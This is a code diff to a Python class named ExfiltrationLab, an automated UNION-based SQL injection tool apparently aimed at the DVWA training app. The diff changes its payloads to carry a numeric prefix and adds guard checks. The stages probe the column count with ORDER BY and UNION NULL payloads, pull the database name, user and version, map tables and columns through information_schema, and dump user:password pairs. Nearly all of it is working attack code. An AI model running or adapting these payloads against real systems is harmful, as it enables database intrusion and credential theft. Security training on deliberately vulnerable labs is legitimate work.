@@ -39,8 +39,9 @@ class ExfiltrationLab:
 
         for stage_fn in stages:
             success = stage_fn()
-            if not success and self.state == "FAILED":
+            if not success:
                 print(f"[!] Extractor Lab: Stage {stage_fn.__name__} failed. Aborting.")
+                self.state = "FAILED"
                 break
             time.sleep(1)
 
@@ -51,9 +52,9 @@ class ExfiltrationLab:
 
     def _discover_columns(self):
         print("[*] Stage 1: Column Count Discovery...")
-        # Strategy: ORDER BY Binary search or linear probe
+        # Strategy: ORDER BY with numeric prefix
         for i in range(1, 15):
-            payload = f" ORDER BY {i}#"
+            payload = f"1 ORDER BY {i}#"
             res = self.client.send_request(payload)
             err = self.validator.get_sql_error(res['text'])
             if err and ("Unknown column" in err or "order clause" in err):
@@ -61,10 +62,10 @@ class ExfiltrationLab:
                 print(f"[+] Found Column Count: {self.column_count}")
                 return True
         
-        # Fallback: UNION Probing
+        # Fallback: UNION Probing with numeric prefix
         for i in range(1, 10):
             nulls = ",".join(["NULL"] * i)
-            payload = f" UNION SELECT {nulls}#"
+            payload = f"1 UNION SELECT {nulls}#"
             res = self.client.send_request(payload)
             if res['status'] == 200 and not self.validator.get_sql_error(res['text']):
                 self.column_count = i
@@ -83,7 +84,7 @@ class ExfiltrationLab:
         target_idx = 1 if self.column_count > 1 else 0
         cols[target_idx] = "CONCAT(0x7e,DATABASE(),0x3a,USER(),0x3a,VERSION(),0x7e)"
         
-        payload = f" UNION SELECT {','.join(cols)}#"
+        payload = f"1 UNION SELECT {','.join(cols)}#"
         res = self.client.send_request(payload)
         
         match = re.search(r"~(.*?)~", res['text'])
@@ -95,12 +96,13 @@ class ExfiltrationLab:
         return False
 
     def _list_tables(self):
+        if self.column_count == 0: return False
         print("[*] Stage 3: Schema Mapping (Tables)...")
         target_idx = 1 if self.column_count > 1 else 0
         cols = ["NULL"] * self.column_count
         cols[target_idx] = "group_concat(table_name)"
         
-        payload = f" UNION SELECT {','.join(cols)} FROM information_schema.tables WHERE table_schema=database()#"
+        payload = f"1 UNION SELECT {','.join(cols)} FROM information_schema.tables WHERE table_schema=database()#"
         res = self.client.send_request(payload)
         
         # DVWA table reflection logic (assumes pre tags or similar containers)
@@ -115,13 +117,14 @@ class ExfiltrationLab:
         return False
 
     def _list_columns(self):
+        if self.column_count == 0: return False
         print(f"[*] Stage 4: Target Discovery (Table: {self.target_table})...")
         target_idx = 1 if self.column_count > 1 else 0
         cols = ["NULL"] * self.column_count
         cols[target_idx] = "group_concat(column_name)"
         
         table_hex = "0x" + "".join([f"{ord(c):02x}" for c in self.target_table])
-        payload = f" UNION SELECT {','.join(cols)} FROM information_schema.columns WHERE table_name={table_hex}#"
+        payload = f"1 UNION SELECT {','.join(cols)} FROM information_schema.columns WHERE table_name={table_hex}#"
         res = self.client.send_request(payload)
         
         match = re.findall(r"([a-z0-9_]+(?:,[a-z0-9_]+)+)", res['text'])
@@ -132,6 +135,7 @@ class ExfiltrationLab:
         return False
 
     def _dump_target_data(self):
+        if self.column_count == 0: return False
         print(f"[*] Stage 5: Final Exfiltration (Dumping {self.target_table})...")
         target_idx = 1 if self.column_count > 1 else 0
         cols = ["NULL"] * self.column_count
@@ -139,7 +143,7 @@ class ExfiltrationLab:
         # Specific search for user/password fields
         cols[target_idx] = "group_concat(user,0x3a,password,0x7c)"
         
-        payload = f" UNION SELECT {','.join(cols)} FROM {self.target_table}#"
+        payload = f"1 UNION SELECT {','.join(cols)} FROM {self.target_table}#"
         res = self.client.send_request(payload)
         
         # Look for user:pass patterns
